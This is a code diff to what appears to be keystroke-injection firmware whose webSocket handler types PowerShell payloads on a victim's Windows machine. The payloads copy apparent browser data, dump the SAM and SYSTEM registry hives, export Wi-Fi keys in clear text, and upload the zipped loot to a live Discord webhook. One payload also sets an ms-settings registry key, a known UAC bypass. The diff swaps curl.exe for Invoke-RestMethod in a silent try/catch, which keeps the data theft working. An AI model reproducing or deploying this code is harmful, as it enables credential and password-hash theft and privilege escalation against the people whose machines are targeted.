@@ -587,10 +587,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "if(Test-Path $d){Copy-Item $d $w};"
             "if(Test-Path $c){Copy-Item $c $w};"
             "Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
-            "curl.exe -F ('file=@'+$t) "
-            "https://discord.com/api/webhooks/1480962111373840517/"
-            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
-            "ciyqaBjdfxN4zgmmvD3;"
+            "$h=Get-Item $t;"
+            "try { Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form @{file=$h} } catch { };"
             "Remove-Item $w -Recurse -Force;Remove-Item $t -Force\" & exit");
         delay(300);
         Keyboard.press(KEY_RETURN);
@@ -619,10 +617,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "reg save HKLM\\SAM $w''''\\sam'''' /y;"
             "reg save HKLM\\SYSTEM $w''''\\system'''' /y;"
             "Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
-            "curl.exe -F (''''file=@''''+$t) "
-            "https://discord.com/api/webhooks/1480962111373840517/"
-            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
-            "ciyqaBjdfxN4zgmmvD3;"
+            "$h=Get-Item $t;"
+            "try { Invoke-RestMethod -Uri ''''https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3'''' -Method Post -Form @{file=$h} } catch { };"
             "Remove-Item $w -Recurse -Force;"
             "Remove-Item $t -Force\"\"\"';"
             "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
@@ -655,10 +651,8 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
             "mkdir $w -Force;"
             "netsh wlan export profile key=clear folder=$w;"
             "Compress-Archive -Path $w\\* -DestinationPath $w.zip -Force;"
-            "curl.exe -F ('file=@'+$w+'.zip') "
-            "https://discord.com/api/webhooks/1480962111373840517/"
-            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
-            "ciyqaBjdfxN4zgmmvD3;"
+            "$h=Get-Item ($w+'.zip');"
+            "try { Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1480962111373840517/0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-ciyqaBjdfxN4zgmmvD3' -Method Post -Form @{file=$h} } catch { };"
             "Remove-Item $w -Recurse -Force;"
             "Remove-Item ($w+'.zip') -Force\" & exit");
         delay(300);
